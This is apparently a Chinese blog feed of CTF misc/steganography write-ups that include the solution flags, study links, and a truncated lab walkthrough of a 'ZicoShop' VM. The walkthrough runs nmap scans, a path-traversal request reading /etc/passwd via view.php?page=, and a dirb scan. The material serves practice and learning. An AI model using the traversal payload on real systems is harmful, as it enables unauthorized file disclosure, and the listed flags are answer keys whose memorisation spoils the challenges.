id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h2><p>hint：小白的网站被小黑攻击了，并且上传了Webshell，你能帮小白找到这个后门么？(Webshell中的密码(md5)即为答案)。</p><p>工具：D盾一扫就出来了</p><p>flag{6ac45fb83b3bc355c024f5034b947dd3}</p><h2 id="荷兰宽带数据泄露"><a href="#荷兰宽带数据泄露" class="headerlink" title="荷兰宽带数据泄露"></a>荷兰宽带数据泄露</h2><p>得到文件：conf.bin</p><p>这是路由器配置文件。RouterPassView打开。</p><p>  找到：Username val=053700357621 </p><p>flag{053700357621}</p><h1 id="2021-1-22"><a href="#2021-1-22" class="headerlink" title="2021/1/22"></a>2021/1/22</h1><h2 id="来首歌吧"><a href="#来首歌吧" class="headerlink" title="来首歌吧"></a>来首歌吧</h2><p>得到文件：stego100.wav</p><p>audacity打开，然后使劲放大得到电码</p><p>flag{5BC925649CB0188F52E617D70929191C}</p><h2 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h2><p>hint：公安机关近期截获到某网络犯罪团伙在线交流的数据包，但无法分析出具体的交流内容，聪明的你能帮公安机关找到线索吗？ </p><p>得到文件：流量中的线索.pcapng</p><p>wireshark抓包HTTP协议的200响应的得到base64编码</p><p><a href="https://the-x.cn/base64解码下载jpg格式图片" target="_blank" rel="noopener">https://the-x.cn/base64解码下载jpg格式图片</a></p><p>flag{209acebf6324a09671abc31c869de72c}</p><h2 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h2><p>得到jpg图片，通过winhex发现有zip部分，后缀改为zip发现实伪加密，zip文件头为50 4B 01 02用010搜索一下，在14后面来改伪加密，得到一个jpg文件，用steghide解决问题：</p><pre><code>steghide info good.jpgsteghide extract -sf good.jpg</code></pre><p>关于这个用法，在windows上的用法简单，自己寻思吧，最后得到文件：ko.txt</p><p>利用里面的密码打开压缩包，就能得到flag</p><p>flag{1RTo8w@&amp;4nK@z*XL}</p><p>不错的一个题</p><h2 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h2><p>将得到图片后缀改为zip就能轻松打开</p><p>得到文件flag.vmdk，里面有个文件名字为nul在windows下面无法显示放到虚拟机试试</p><pre><code>7z x flag.vmdk -o./tree</code></pre><p>flag{N7F5_AD5_i5_funny!}</p><h1 id="2021-1-23"><a href="#2021-1-23" class="headerlink" title="2021/1/23"></a>2021/1/23</h1><h2 id="webshell后门"><a href="#webshell后门" class="headerlink" title="webshell后门"></a>webshell后门</h2><p>hint：朋友的网站被黑客上传了webshell后门，他把网站打包备份了，你能帮忙找到黑客的webshell在哪吗？(Webshell中的密码(md5)即为答案)。</p><p>D盾一把梭</p><p>flag{ba8e6c6f35a53933b871480bb9a9545c}</p><h2 id="被劫持的神秘礼物"><a href="#被劫持的神秘礼物" class="headerlink" title="被劫持的神秘礼物"></a>被劫持的神秘礼物</h2><p>hint：某天小明收到了一件很特别的礼物，有奇怪的后缀，奇怪的名字和格式。小明找到了知心姐姐度娘，度娘好像知道这是啥，但是度娘也不知道里面是啥。。。你帮帮小明？找到帐号密码，串在一起，用32位小写MD5哈希一下得到的就是答案。</p><p>得到的文件用wireshark打开过滤只看HTTP</p><p>看到login数据包，查看分组字节流发现：name=admina&amp;word=adminb</p><p>adminaadminb搜索在线md5hash或者本地工具hash</p><p>flag{1d240aafe21a86afc11f38a45b541a49}</p><h2 id="刷新过的图片"><a href="#刷新过的图片" class="headerlink" title="刷新过的图片"></a>刷新过的图片</h2><p>知识点：F5隐写</p><p>kali中安装F5-steganography 工具</p><pre><code>git clone https://github.com/matthewgao/F5-steganography</code></pre><p>解密的时候输入：</p><pre><code>java Extract /图片的绝对路径 [-p 密码] [-e 输出文件]</code></pre><p>此处要粘贴文件名，然后得到文件output.txt，打开文本发现有pk字样，基本就可以确定是zip，所有不需要hxd打开，得到flag：flag{96efd0a2037d06f34199e921079778ee}</p><h2 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h2><p>改为zip文件得到key，cipher（密码）文件</p><p>key.txt打开得到：V2hhdCBpcyBOaWNraSBNaW5haidzIGZhdm9yaXRlIHNvbmcgdGhhdCByZWZlcnMgdG8gc25ha2VzPwo=</p><p>base64解码后得到：What is Nicki Minaj’s favorite song that refers to snakes?（妮琪·米娜最喜欢的一首提到蛇的歌是什么？）百度得到巨蟒：anaconda（这个mv十分的带劲！！！！）</p><p><del>看完wp得知：</del>联想到以蛇命名的加密算法Serpent。以anaconda为密钥，用<a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">在线工具</a>对cipher进行解密。</p><p>选择针对文件的解密，key就是anaconda，最后得到flag：</p><p>CTF{who_knew_serpent_cipher_existed}</p><h1 id="2021-1-24"><a href="#2021-1-24" class="headerlink" title="2021/1/24"></a>2021/1/24</h1><p>ctfshow大吉大利杯</p><h1 id="2021-01-25"><a href="#2021-01-25" class="headerlink" title="2021-01-25"></a>2021-01-25</h1><h2 id="BJDCTF-2nd-圣火昭昭-y1ng"><a href="#BJDCTF-2nd-圣火昭昭-y1ng" class="headerlink" title="[BJDCTF 2nd]圣火昭昭-y1ng"></a>[BJDCTF 2nd]圣火昭昭-y1ng</h2><p>题目：开局一张图，flag全靠<strong>猜</strong></p><p>因为出题人失误搞错了，解出来的key去掉后3位的com</p><p>右键属性，详细信息：新佛曰：諸壽隸僧壽降吽壽諸壽陀壽摩隸僧缽薩願心壽咤壽囉寂壽闍諸壽哆壽慧壽聞壽色吽愍壽所壽蜜如</p><p>解得：gemlove</p><p>再根据题目中加粗的<strong>猜</strong>字，尝试使用outguess。</p><pre><code>git clone https://github.com/crorvick/outguess.gitcd outguess./configure &amp;&amp; make &amp;&amp; make installoutguess -k gemlove -r &#39;/root/outguess/CTF/sheng_huo_zhao_zhao.jpg&#39; flag.txtlscat flag.txtBJD{wdnmd_misc_1s_so_Fuck1ng_e@sy}</code></pre><p>按照wp来就行</p><h2 id="梅花香之苦寒来（水文）"><a href="#梅花香之苦寒来（水文）" class="headerlink" title="梅花香之苦寒来（水文）"></a>梅花香之苦寒来（水文）</h2><p>两种解法都失败，这里只记录一种简单的做法：</p><p>hxd打开看见ÿÙ（ff d9）是16进制开头的数字，转码ascⅡ得到神秘小坐标</p><p>gnuplot使用步骤</p><p>1.终端输入gnuplot</p><p>2.进入后输入plot ，文件直接拖进去</p><p>3.可以直接看到图了</p><p>文件格式只需要留下逗号</p><h2 id="菜刀666"><a href="#菜刀666" class="headerlink" title="菜刀666"></a>菜刀666</h2><p>得到文件后缀：pcapng，wireshark打开</p><p>待解。</p><h1 id="2021-01-26"><a href="#2021-01-26" class="headerlink" title="2021-01-26"></a>2021-01-26</h1><h2 id="少了一半？？-题目来自starsnow"><a href="#少了一半？？-题目来自starsnow" class="headerlink" title="少了一半？？(题目来自starsnow)"></a>少了一半？？(题目来自starsnow)</h2><p>得到的是jpg文件</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8826%E6%97%A51537_1.png" alt></p><p>这里将黑色标记的41改为EE得到flag</p><h1 id="2021-01-27"><a href="#2021-01-27" class="headerlink" title="2021-01-27"></a>2021-01-27</h1><p>学习php</p><p><a href="https://www.runoob.com/php/php-syntax.html" target="_blank" rel="noopener">PHP 语法</a></p><p><a href="https://www.runoob.com/php/php-variables.html" target="_blank" rel="noopener">PHP 变量</a></p><p><a href="https://www.runoob.com/php/php-echo-print.html" target="_blank" rel="noopener">PHP echo/print</a></p><p><a href="https://www.runoob.com/php/php-datatypes.html" target="_blank" rel="noopener">PHP 数据类型</a></p><p><a href="https://www.runoob.com/php/php-types-comparisons.html" target="_blank" rel="noopener">PHP 类型比较</a></p><p><a href="https://www.runoob.com/php/php-constants.html" target="_blank" rel="noopener">PHP 常量</a></p><p><a href="https://www.runoob.com/php/php-string.html" target="_blank" rel="noopener">PHP 字符串</a></p><p><a href="https://www.runoob.com/php/php-operators.html" target="_blank" rel="noopener">PHP 运算符</a></p><h1 id="2021-01-28"><a href="#2021-01-28" class="headerlink" title="2021-01-28"></a>2021-01-28</h1><p><a href="https://www.runoob.com/php/php-if-else.html" target="_blank" rel="noopener">PHP If…Else</a></p><p><a href="https://www.runoob.com/php/php-switch.html" target="_blank" rel="noopener">PHP Switch</a></p><p><a href="https://www.runoob.com/php/php-arrays.html" target="_blank" rel="noopener">PHP 数组</a></p><p><a href="https://www.runoob.com/php/php-arrays-sort.html" target="_blank" rel="noopener">PHP 数组排序</a></p><p><a href="https://www.runoob.com/php/php-superglobals.html" target="_blank" rel="noopener">PHP 超级全局变量</a></p><p><a href="https://www.runoob.com/php/php-looping.html" target="_blank" rel="noopener">PHP While 循环</a></p><p><a href="https://www.runoob.com/php/php-looping-for.html" target="_blank" rel="noopener">PHP For 循环</a></p><p><a href="https://www.runoob.com/php/php-functions.html" target="_blank" rel="noopener">PHP 函数</a></p><h1 id="2021-01-29"><a href="#2021-01-29" class="headerlink" title="2021-01-29"></a>2021-01-29</h1><p>黑马教程-p53</p><h1 id="2021-01-30"><a href="#2021-01-30" class="headerlink" title="2021-01-30"></a>2021-01-30</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>黑马教程p54+16=p70</p><h1 id="2021-01-31"><a href="#2021-01-31" class="headerlink" title="2021-01-31"></a>2021-01-31</h1><h2 id="PHP-1"><a href="#PHP-1" class="headerlink" title="PHP"></a>PHP</h2><p>黑马教程p70+16=p86</p><h2 id="被偷走的文件"><a href="#被偷走的文件" class="headerlink" title="被偷走的文件"></a>被偷走的文件</h2><p>得到我文件用wireshark打开，过滤出ftp文件传输协议，右键追踪流点击tcp发现了flag.rar，用foremost跑一下，得到rar压缩包，四位数爆破得到密码5790，打开得到flag</p><p>flag{6fe99a5d03fb01f833ec3caa80358fa3}</p><h2 id="BJDCTF2020-认真你就输了"><a href="#BJDCTF2020-认真你就输了" class="headerlink" title="[BJDCTF2020]认真你就输了"></a>[BJDCTF2020]认真你就输了</h2><p>得到文件10.xls，打开以后我得到是乱码，但是在文件头看见pk字节是zip压缩包的标准，于是用foremost打开跑一下，得到压缩包，打开即可找到flag.txt</p><h2 id="被偷走的文件-1"><a href="#被偷走的文件-1" class="headerlink" title="被偷走的文件"></a>被偷走的文件</h2><p>得到我文件用wireshark打开，过滤出ftp文件传输协议，右键追踪流点击tcp发现了flag.rar，用foremost跑一下，得到rar压缩包，四位数爆破得到密码5790，打开得到flag</p><p>flag{6fe99a5d03fb01f833ec3caa80358fa3}</p><h2 id="BJDCTF2020-认真你就输了-1"><a href="#BJDCTF2020-认真你就输了-1" class="headerlink" title="[BJDCTF2020]认真你就输了"></a>[BJDCTF2020]认真你就输了</h2><p>得到文件10.xls，打开以后我得到是乱码，但是在文件头看见pk字节是zip压缩包的标准，于是用foremost打开跑一下，得到压缩包，打开即可找到flag.txt</p><h1 id="2021-02-01"><a href="#2021-02-01" class="headerlink" title="2021-02-01"></a>2021-02-01</h1><p>黑马教程p86-p96</p><h1 id="2021-02-02"><a href="#2021-02-02" class="headerlink" title="2021-02-02"></a>2021-02-02</h1><h2 id="BJDCTF2020-藏藏藏"><a href="#BJDCTF2020-藏藏藏" class="headerlink" title="[BJDCTF2020]藏藏藏"></a>[BJDCTF2020]藏藏藏</h2><p>得到jpg，将后缀改为zip，得到一个二维码，用qr research扫描一下得到flag{you are the best!}</p><h2 id="GXYCTF2019-佛系青年"><a href="#GXYCTF2019-佛系青年" class="headerlink" title="[GXYCTF2019]佛系青年"></a>[GXYCTF2019]佛系青年</h2><p>得到压缩包，显示一部伪加密，从504B0102开始计算，第九第十个字符为加密字段，将其设置为0000即可变成无加密状态。50下面数5，6行的位置，14000900，将9改为0，破解伪加密，得到佛文，旧佛曰解密（带上佛曰二字）得：flag{w0_fo_ci_Be1}</p><p>补充：.RAR文件由于有头部校验，使用伪加密时打开文件会出现报错，使用winhex修改标志位后如报错消失且正常解压缩，说明是伪加密。使用winhex打开RAR文件，找到第24个字节，该字节尾数为4表示加密，0表示无加密，将尾数改为0即可破解伪加密。</p><h1 id="2021-02-03-立春"><a href="#2021-02-03-立春" class="headerlink" title="2021-02-03(立春)"></a>2021-02-03(立春)</h1><h2 id="秘密文件"><a href="#秘密文件" class="headerlink" title="秘密文件"></a>秘密文件</h2><p>引子：深夜里，Hack偷偷的潜入了某公司的内网，趁着深夜偷走了公司的秘密文件，公司的网络管理员通过通过监控工具成功的截取Hack入侵时数据流量，但是却无法分析出Hack到底偷走了什么机密文件，你能帮帮管理员分析出Hack到底偷走了什么机密文件吗？</p><p>wireshark打开追踪ftp文件传输协议的流的得到小偷盗走的是：6b0341642a8ddcbeb7eca927dae6d541.rar压缩包</p><p>所以尝试使用foremost分离一下得到一个压缩包爆破得到密码1903，里面有个文件就是 6b0341642a8ddcbeb7eca927dae6d541.txt，所以上面咱分析的没错，但是根据题目要求，分离一步多此一举</p><h2 id="BJDCTF2020-你猜我是个啥"><a href="#BJDCTF2020-你猜我是个啥" class="headerlink" title="[BJDCTF2020]你猜我是个啥"></a>[BJDCTF2020]你猜我是个啥</h2><p>得到压缩包，直接压缩包损坏，我直接觉得是伪加密，打开一看一点zip的样子都没有，是png，直接得到一张二维码qr一扫，跟我说flag不在这，那么foremost再一跑，没东西。stesolve也没东西，让我想起来了用winhex发现的flag，十分不像因为这样的话就太。。简单了，但是就是他。。。。</p><p>flag{i_am_fl@g}</p><h2 id="SWPU2019-神奇的二维码"><a href="#SWPU2019-神奇的二维码" class="headerlink" title="[SWPU2019]神奇的二维码"></a>[SWPU2019]神奇的二维码</h2><p>188kb做为一张简单的二维码，你太大了，改为zip文件得到文本encode，内容是base64，解码得到：asdfghjkl1234567890，这应该不是flag，binwalk -e 123.rar</p><p>从其中一个文件得到一大串base加密的，python实现自动解码base64得到：comEON_YOuAreSOSoS0great</p><p>得到mp3文件，是莫斯电码：morseisveryveryeasy←转码得到，flag{morseisveryveryeasy}</p><h1 id="2021-02-04-小年"><a href="#2021-02-04-小年" class="headerlink" title="2021-02-04(小年)"></a>2021-02-04(小年)</h1><h2 id="BJDCTF-2nd-EasyBaBa"><a href="#BJDCTF-2nd-EasyBaBa" class="headerlink" title="[BJDCTF 2nd]EasyBaBa"></a>[BJDCTF 2nd]EasyBaBa</h2><p>注意力注意了，新思路！！</p><p>函数：</p><p>php hex2bin()函数：把十六进制值转换为 ASCII 字符</p><p>功能：交错，将一张图片盖到另一张图片上，可以使用反交错功能进行解决</p><p>1.file 1.jpg可以查看文件的类型，可以将文件类型改为avi变成一个小视频，其在winhex中的开头前缀为：riff</p><p>2.采用软件进行分帧和反交错处理：Kinovea</p><p>3.得到的二维码不清晰，采用降低亮度，提高对比度</p><p>4.将扫码得到的内容进行16进制转ascii码得：</p><p>125帧扫码得到：6167696E5F6C，转码为agin_l；129帧扫码得到：6F76655F59，转码为ove_Y；133帧扫码得到：424A447B696D，转码为BJD{im；136帧扫码得到：316E677D，转码为1ng}。拼接得到BJD{imagin_love_Y1ng}，即为flag。</p><h2 id="山司小年红包题目"><a href="#山司小年红包题目" class="headerlink" title="山司小年红包题目"></a>山司小年红包题目</h2><p>1.得到二维码，扫码得到Sir Your Plane Will Arrive At (2p. m. )</p><p>2.foremost分离得到zip，密码采用爆破自定义的字符串：sypwaa1400得到密码</p><p>3.得到01二进制，题目名字为qr_code所以联想到二进制转二维码通过脚本（使用前要pip install pillow，否则无法运行pil版块）：</p><pre><code>from PIL import ImageMAX = 21width = 25height = 25pic = Image.new(&quot;RGB&quot;,(width, height))str = &quot;&quot;#输入二进制i=0for y in range (0,height):    for x in range (0,width):        if(str[i] == &#39;1&#39;):            pic.putpixel([x,y],(0, 0, 0))        else:            pic.putpixel([x,y],(255,255,255))        i = i+1pic.show()pic.save(&quot;flag.png&quot;)</code></pre><p>得到图片以后通过在线ps得到完整的二维码，扫码得到flag</p><h1 id="2021-02-05"><a href="#2021-02-05" class="headerlink" title="2021-02-05"></a>2021-02-05</h1><h2 id="BJDCTF2020-一叶障目"><a href="#BJDCTF2020-一叶障目" class="headerlink" title="[BJDCTF2020]一叶障目"></a>[BJDCTF2020]一叶障目</h2><p>都说是一叶障目考虑到图片高度被修改，采用脚本计算模板(注意需要安装cypto模板，但是需要安装p开头的)：</p><pre><code>import structimport binasciifrom Crypto.Util.number import bytes_to_longimg = open(&#39;C:/Users/Administrator/Desktop/1.png&#39;, &#39;rb&#39;).read()for i in range(0xFFFF):    stream = img[12:20] + struct.pack(&#39;&gt;i&#39;, i) + img[24:29]    crc = binascii.crc32(stream)    if crc == bytes_to_long(img[29:33]):        print(i, hex(i))</code></pre><p>得到高度为844而其16进制为34c所以给为034c即可</p><p>得到修改的图片为xaflag{66666}</p><h2 id="傅里叶光学实验-山司平台"><a href="#傅里叶光学实验-山司平台" class="headerlink" title="傅里叶光学实验(山司平台)"></a>傅里叶光学实验(山司平台)</h2><p>利用脚本放在同一个目录直接跑就行</p><pre><code>import numpy as npimport cv2 as cvfrom matplotlib import pyplot as pltimg = cv.imread(&#39;1.bmp&#39;, 0)f = np.fft.fft2(img)logf = 20*np.log(np.abs(f))plt.imshow(logf, &#39;gray&#39;)plt.show()</code></pre><p>坑：需要安装模板matplotlib（这个需要注意，其余的没坑）<a href="https://blog.csdn.net/zzx2016zzx/article/details/83099583" target="_blank" rel="noopener">https://blog.csdn.net/zzx2016zzx/article/details/83099583</a></p><h1 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h1><p>会有client.pcap和serve.key文件，打开wireshark点击编辑</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B402%E6%9C%8805%E6%97%A52318_1.png" alt></p><p>ok我已经很详细的做出一张图，最后解密完，搜索http即可找到flag</p><h1 id="2021-02-08"><a href="#2021-02-08" class="headerlink" title="2021-02-08"></a>2021-02-08</h1><h2 id="穿越时空的思念"><a href="#穿越时空的思念" class="headerlink" title="穿越时空的思念"></a>穿越时空的思念</h2><p>嫦娥当年奔月后，非常后悔，因为月宫太冷清，她想：早知道让后羿自己上来了，带了只兔子真是不理智。于是她就写了一首曲子，诉说的是怀念后羿在的日子。无数年后，小明听到了这首曲子，毅然决定冒充后羿。然而小明从曲子中听不出啥来，咋办。。</p><p>得到音乐mp3，带有摩斯密码，用audacity打开分离音乐，解得：f029bd6f551139eedeb8e45a175b0786</p><p>flag{f029bd6f551139eedeb8e45a175b0786}</p><h2 id="BJDCTF2020-鸡你太美"><a href="#BJDCTF2020-鸡你太美" class="headerlink" title="[BJDCTF2020]鸡你太美"></a>[BJDCTF2020]鸡你太美</h2><p>得到两张gif，但是第二张无法显示winhex打开，gif89a的gif文件头被篡改16进制为47494638,flag{zhi_yin_you_are_beautiful}</p><h1 id="转战ctfshow"><a href="#转战ctfshow" class="headerlink" title="转战ctfshow"></a>转战ctfshow</h1>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>千锋资源</title>
      <link href="/2021/01/14/qian-feng-zi-yuan/"/>
      <url>/2021/01/14/qian-feng-zi-yuan/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="千峰在线学习地址："><a href="#千峰在线学习地址：" class="headerlink" title="千峰在线学习地址："></a><strong>千峰在线学习地址：</strong></h3><p><strong>在线观看地址：</strong><a href="http://www.mobiletrain.org/testing/video-list3.shtml" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list3.shtml</a><br><strong>官方B站地址：</strong><a href="https://space.bilibili.com/146668655" target="_blank" rel="noopener">https://space.bilibili.com/146668655</a><br><strong>官方知乎地址：</strong><a href="https://www.zhihu.com/org/qian-feng-jiao-yu-39" target="_blank" rel="noopener">https://www.zhihu.com/org/qian-feng-jiao-yu-39</a></p><h3 id="各学科学习资源："><a href="#各学科学习资源：" class="headerlink" title="各学科学习资源："></a><strong>各学科学习资源：</strong></h3><p><strong>Java：</strong><a href="http://www.mobiletrain.org/testing/video-list-java.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-java.shtml?ssss</a></p><p><strong>HTML5/web前端：</strong><a href="http://www.mobiletrain.org/testing/video-list-html5.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-html5.shtml?ssss</a></p><p><strong>Python：</strong><a href="http://www.mobiletrain.org/testing/video-list-python.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-python.shtml?ssss</a></p><p><strong>UI设计：</strong><a href="http://www.mobiletrain.org/testing/video-list-ui.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-ui.shtml?ssss</a></p><p><strong>Linux/云计算：</strong><a href="http://www.mobiletrain.org/testing/video-list-linux.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-linux.shtml?ssss</a></p><p><strong>软件测试：</strong><a href="http://www.mobiletrain.org/testing/video-list-rjcs.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-rjcs.shtml?ssss</a></p><p><strong>大数据：</strong><a href="http://www.mobiletrain.org/testing/video-list-bigdata.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-bigdata.shtml?ssss</a></p><p><strong>物联网：</strong><a href="http://www.mobiletrain.org/testing/video-list-wlw.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-wlw.shtml?ssss</a></p><p><strong>网络安全：</strong><a href="http://www.mobiletrain.org/testing/video-list-wlaq.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-wlaq.shtml?ssss</a></p><p><strong>互联网营销：</strong><a href="http://www.mobiletrain.org/testing/video-list-wlyx.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-wlyx.shtml?ssss</a></p><p><strong>go语言：</strong><a href="http://www.mobiletrain.org/testing/video-list-go.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-go.shtml?ssss</a></p><p><strong>Unity/游戏开发：</strong><a href="http://www.mobiletrain.org/testing/video-list-unity.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-unity.shtml?ssss</a></p><p><strong>PHP：</strong><a href="http://www.mobiletrain.org/testing/video-list-php.shtml?ssss" target="_blank" rel="noopener">http://www.mobiletrain.org/testing/video-list-php.shtml?ssss</a></p><h3 id="计算机等级考试资源："><a href="#计算机等级考试资源：" class="headerlink" title="计算机等级考试资源："></a><strong>计算机等级考试资源：</strong></h3><p><strong>2020版_全国计算机等级考试二级Java程序设计</strong><br>在线观看：<a href="https://www.bilibili.com/video/BV1sT4y1F7Ka" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1sT4y1F7Ka</a><br>网盘链接：<a href="https://pan.baidu.com/s/1u2bXcvACHD-i1bbsOjS2WQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1u2bXcvACHD-i1bbsOjS2WQ</a> 提取码: 2igi<br><strong>2020版_全国计算机Python二级真题讲解</strong><br>在线观看：<a href="https://www.bilibili.com/video/BV1qy4y1B7wN" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1qy4y1B7wN</a><br>网盘链接：<a href="https://pan.baidu.com/s/1T4e0roIO3a3HxXjslxmAPQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1T4e0roIO3a3HxXjslxmAPQ</a> 提取码: fk9x<br><strong>2020版_全国计算机Web二级等级考试</strong><br>在线观看：<a href="https://www.bilibili.com/video/BV1GV411y7VT" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1GV411y7VT</a><br>网盘链接：<a href="https://pan.baidu.com/s/1H2Mr2hA37n2JH_dxNi-Vzg" target="_blank" rel="noopener">https://pan.baidu.com/s/1H2Mr2hA37n2JH_dxNi-Vzg</a> 提取码: fjxb<br><strong>2020年计算机全国等级考试二级C语言教程</strong><br>在线观看：<a href="https://www.bilibili.com/video/BV1Ht4y1i7tx" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1Ht4y1i7tx</a><br>网盘链接：<a href="https://pan.baidu.com/s/10GvfUrglGGs4KREwJcxKYA" target="_blank" rel="noopener">https://pan.baidu.com/s/10GvfUrglGGs4KREwJcxKYA</a> 提取码: 5v8p<br><strong>2020版_全国计算机MySQL二级等级考试</strong><br>在线观看：<a href="https://www.bilibili.com/video/BV1Ni4y137A7" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1Ni4y137A7</a><br>网盘链接：<a href="https://pan.baidu.com/s/1TLU5iYtJmEpqQ0EREVVfFg" target="_blank" rel="noopener">https://pan.baidu.com/s/1TLU5iYtJmEpqQ0EREVVfFg</a> 提取码: i622<br><strong>2020版全国计算机一级WPS Office全套考试教程</strong><br>在线观看：<a href="https://www.bilibili.com/video/BV1dK411A7fu" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1dK411A7fu</a><br>网盘链接：<a href="https://pan.baidu.com/s/1Ld7pMDtmm7j4ZdL5DHpw3Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1Ld7pMDtmm7j4ZdL5DHpw3Q</a> 提取码: 6ngp</p><h3 id="其他资源："><a href="#其他资源：" class="headerlink" title="其他资源："></a><strong>其他资源：</strong></h3><p><strong>最新千锋PMP项目管理视频 ：</strong><a href="https://pan.baidu.com/s/1YwwUMA4gdQCWnjDnzpYkAg" target="_blank" rel="noopener">https://pan.baidu.com/s/1YwwUMA4gdQCWnjDnzpYkAg</a> 提取码: m47c<br><strong>【源码】千锋教程书籍系列 ：</strong><a href="https://pan.baidu.com/s/1m3shb69H8LrDW5_c3Yk_xA" target="_blank" rel="noopener">https://pan.baidu.com/s/1m3shb69H8LrDW5_c3Yk_xA</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习资料 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZicoShop</title>
      <link href="/2021/01/09/zicoshop/"/>
      <url>/2021/01/09/zicoshop/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=188204&auto=1&height=66"></iframe><p>简介：</p><p>是一个电子商务建站技术网站Zico-Shop</p><p>主要功能：</p><p>建站技术</p><p>网店案例</p><h2 id="发现服务："><a href="#发现服务：" class="headerlink" title="发现服务："></a>发现服务：</h2><p>补充：</p><p>-sV:V扫描到的服务的端口号，apache 2.4</p><p>-sT:TCP -sS:SYN  -A：显示详细的信息</p><p>得到目标主机开放端口和操作系统</p><pre><code>nmap -sP 192.168.204.0/24nmap -sS -Pn -n -A -O -T4 192.168.204.141</code></pre><p>发现端口：</p><p>22ssh</p><p>80HTTP</p><p>111rpcbind 2-4（不知道是什么的端口）</p><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>常识：</p><p>/etc/password存储linux系统所有的用户信息</p><p>linux网站文件的默认目录：/var/www</p><p>在URL内通过目录穿越../../../etc/passwd来尝试访问</p><p>发现：</p><p>The requested URL /etc/password was not found on this server.</p><p>那么该网站的二级目录再次进行查找</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51024_1.png" alt></p><p>点开以后的URL变为：</p><p><a href="http://192.168.204.141/view.php?page=tools.html" target="_blank" rel="noopener">http://192.168.204.141/view.php?page=tools.html</a></p><p>修改参数：</p><p><a href="http://192.168.204.141/view.php?page=../../etc/passwd" target="_blank" rel="noopener">http://192.168.204.141/view.php?page=../../etc/passwd</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51058_2.png" alt></p><h2 id="目录发现："><a href="#目录发现：" class="headerlink" title="目录发现："></a>目录发现：</h2><pre><code>dirb http://192.168.204.141/ ←注意空格/usr/share/dirb/wordlists/common.txt</code></pre><p>发现以下目录：</p><pre><code>---- Scanning URL: http://192.168.204.141/ ----+ http://192.168.204.141/cgi-bin/ (CODE:403|SIZE:291)                           ==&gt; DIRECTORY: http://192.168.204.141/css/                                      ==&gt; DIRECTORY: http://192.168.204.141/dbadmin/                                  ==&gt; DIRECTORY: http://192.168.204.141/img/                                      + http://192.168.204.141/index (CODE:200|SIZE:7970)                             + http://192.168.204.141/index.html (CODE:200|SIZE:7970)                        ==&gt; DIRECTORY: http://192.168.204.141/js/                                       + http://192.168.204.141/LICENSE (CODE:200|SIZE:1094)                           + http://192.168.204.141/package (CODE:200|SIZE:789)                            + http://192.168.204.141/server-status (CODE:403|SIZE:296)                      + 